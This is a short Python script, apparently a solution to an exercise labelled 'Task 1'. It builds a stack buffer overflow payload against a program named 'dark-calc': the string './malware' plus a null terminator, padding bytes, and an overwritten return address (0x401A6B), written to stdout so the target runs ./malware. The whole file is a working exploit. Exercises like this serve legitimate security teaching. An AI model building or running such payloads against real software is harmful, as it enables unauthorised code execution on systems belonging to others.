#!/usr/bin/env python3
"""Task 1: exploit dark-calc's stack buffer to execute ./malware."""

import struct
import sys


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


payload = (
    b"./malware\x00"
    + b"A" * 6 
    + b"B" * 8
    + p64(0x401A6B) 
)

sys.stdout.buffer.write(payload)
